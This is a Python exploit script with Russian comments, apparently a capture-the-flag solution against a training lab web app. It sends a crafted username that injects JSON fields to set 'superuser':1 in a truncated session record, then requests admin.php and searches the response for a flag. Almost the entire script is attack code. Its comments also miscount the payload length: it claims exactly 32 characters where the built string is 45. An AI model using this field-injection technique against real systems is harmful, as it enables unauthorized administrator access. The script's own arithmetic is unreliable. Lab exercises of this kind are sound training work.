import requests
import re

url = "http://web.li13d6g3c03vqbya3wmy.labs.cyber-ed.space/"

# Рассчитываем точно:
# Оригинал: ...","secret":"                                ","superuser":0}
# Нам нужно: ...","secret":"[32 символа]","superuser":1}
# Где [32 символа] = 19 символов + '","superuser":1}'

# '","superuser":1}' = 15 символов
# Нужно 32-15 = 17 символов перед ним

payload_username = '","secret":"' + ' ' * 17 + '","superuser":1}'
print(f"Username length: {len(payload_username)}")
print(f"Username: {repr(payload_username)}")

# После обрезки до 32 символов:
# '","secret":"                 ","superuser":1}'
# Это ровно 32 символа!

payload = {
    'username': payload_username,
    'age': '15',
    'difficulty': 'easy'
}

s = requests.Session()
resp = s.get(url + "index.php")

print("\nОтправляем payload...")
resp = s.post(url + "index.php", data=payload)
print(f"POST status: {resp.status_code}")

print("\nПробуем admin.php...")
resp = s.get(url + "admin.php")

print(f"Status: {resp.status_code}")
if resp.status_code == 200:
    print(f"Response: {resp.text}")
else:
    print(f"Response preview: {resp.text[:500]}")

# Ищем флаг
flag_match = re.search(r'flag\{[^}]+\}', resp.text)
if flag_match:
    print(f"\nФЛАГ НАЙДЕН: {flag_match.group(0)}")
else:
    print("\nФлаг не найден")